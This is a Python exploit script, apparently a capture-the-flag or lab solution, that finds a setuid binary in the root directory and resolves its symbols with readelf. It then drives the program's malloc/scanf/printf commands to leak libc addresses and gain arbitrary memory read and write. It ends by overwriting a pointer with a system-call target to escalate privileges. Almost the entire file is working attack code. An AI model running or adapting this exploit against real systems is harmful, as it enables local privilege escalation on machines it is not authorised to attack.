import os
import sys
import stat

def get_stored_idx(addr):
    gap = addr - stored
    return gap // 4

def get_messages_idx(addr):
    gap = addr - messages
    return gap // 8

def idx_stored_addr(idx):
    return stored + idx * 4

def idx_messages_addr(idx):
    return messages + idx * 8

def set_offset(o):
    global messages, stored, dso
    messages += o
    stored += o
    dso += o

def backlink(m_addr):
    s = idx_stored_addr(get_messages_idx(m_addr))
    return get_messages_idx(s)

def scan_vulnfile():
    l = os.listdir("/")
    for f in l:
        abs_path = os.path.join("/", f)
        if not os.path.isfile(abs_path):
            continue
        if os.stat(abs_path).st_mode & stat.S_ISUID:
            return abs_path
    sys.stderr.write("Setuid program not found\n")
    exit(0)
    
def scan_address(vuln, symbol):
    os.system("readelf -s %s | grep \"%s\" | awk '{print $2}' > /tmp/%s" % (vuln, symbol, symbol))
    if not os.path.isfile("/tmp/%s" % symbol):
    	sys.stderr.write("%s not found in %s file\n" %(symbol, vuln))

    with open("/tmp/%s" % symbol, "r") as f:
    	addr = int(f.readline(),16)
    return addr

def check_address(addr):
    byte_arr = addr.to_bytes(8, 'little')
    if byte_arr.strip() != byte_arr:
    	sys.stderr.write("%s can not use...\n" % hex(addr))
    	return False

    if int.from_bytes(byte_arr.strip(b'\x00'), 'little') != addr:
    	sys.stderr.write("%s can not use...\n" % hex(addr))
    	return False
    return True

def init_access():
    if not check_address(offset+dso+0x8):
    	sys.stderr.write("init access failed...\n")
    	exit(0)
    sys.stdout.buffer.write(b"malloc %d\n" % backlink(dso + 0x8))
    sys.stdout.buffer.write(b"scanf %d\n" % get_messages_idx(dso))

    sys.stdout.buffer.write((dso+0x8).to_bytes(8, 'little').strip(b'\x00') + b'\n')
    sys.stderr.write("init access success!\n")
    
def read_offset():
    sys.stdout.buffer.write(b"malloc %d\n" % backlink(dso))
    sys.stdout.buffer.write(b"printf %d\n" % get_messages_idx(dso))
    offset = int(input(),16) - dso
    sys.stderr.write("offset: %s\n" % hex(offset))
    return offset

def read_memory(addr):
    if not check_address(addr):
    	sys.stderr.write("read_memory failed...\n")
    	exit(0)
    sys.stdout.buffer.write(b"scanf %d\n" % get_messages_idx(dso))
    sys.stdout.buffer.write(addr.to_bytes(8,'little').strip(b'\x00') + b'\n')
    sys.stdout.buffer.write(b"printf %d\n" % get_messages_idx(dso + 0x8))
    return int(input(), 16)

def write_memory(addr, addr2):
    if not check_address(addr):
    	sys.stderr.write("write memory failed...\n")
    	exit(0)
    if not check_address(addr2):
    	sys.stderr.write("write memory failed...\n")
    	exit(0)

    sys.stdout.buffer.write(b"scanf %d\n" % get_messages_idx(dso))
    sys.stdout.buffer.write(addr.to_bytes(8,'little').strip(b'\x00') + b'\n')
    sys.stdout.buffer.write(b"scanf %d\n" % get_messages_idx(dso + 0x8))
    sys.stdout.buffer.write(addr2.to_bytes(8,'little').strip(b'\x00') + b'\n')
    
offset = 0
# Step 0. Find setuid program
binfile = scan_vulnfile()

# Step 1. Find symbol address
messages = scan_address(binfile, "messages")
stored = scan_address(binfile, "stored")
dso = scan_address(binfile, "__dso_handle")
    
if __name__ == "__main__":
    offset = read_offset()
    set_offset(offset)
    init_access()
    libc = (read_memory(dso+0x19)>>4) << 12
    do_sys = libc - (0x1ec000 - 0xe6850)
    libc -= (0x7f43c1fe5000-0x7f43c1df4f28)
    libc -= (0x7fbb40b5bf28-0x7fbb40b5bec8)
    write_memory(libc, offset+0x1780+964)
    write_memory(libc+0x18+0x438, do_sys)
    sys.stdout.buffer.write(b"quit\n")
    sys.stderr.buffer.write(b"quit\n")
    #stack = read_memory(libc)
    #stack += (0x7ffd3854cb88-0x7ffd3854cacf)
    #s = read_memory(stack)
    #k = read_memory(s)
    
    
